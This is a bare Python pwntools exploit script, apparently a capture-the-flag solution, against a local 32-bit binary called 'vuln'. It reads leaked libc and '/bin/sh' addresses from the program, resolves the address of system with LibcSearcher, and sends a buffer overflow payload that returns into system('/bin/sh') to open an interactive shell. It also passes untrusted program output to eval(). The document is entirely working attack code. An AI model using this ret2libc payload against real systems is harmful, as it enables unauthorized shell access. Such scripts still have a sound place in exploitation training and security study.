from pwn import *
from LibcSearcher import LibcSearcher

p = process("./vuln")
# /lib/i386-linux-gnu/libc.so.6
p.recvuntil("puts: ")
puts_addr = eval(p.recvuntil("\n" , drop = True))
p.recvuntil("useful_string: ")
bin_sh = eval(p.recvuntil("\n" , drop = True))
code_base = bin_sh - 0x2030
log.info("code_base : " + hex(code_base))
# log.info("break_point : " + hex(code_base + 0x7bf) )
libc = LibcSearcher("puts" , puts_addr)
libc_base = puts_addr - libc.dump("puts")
system = libc_base + libc.dump("system")
paylad = "a" * 0x9c + "b" * 4 + p32(system) + p32(0xdeadbeef) + p32(bin_sh)
p.sendline(paylad)

p.interactive()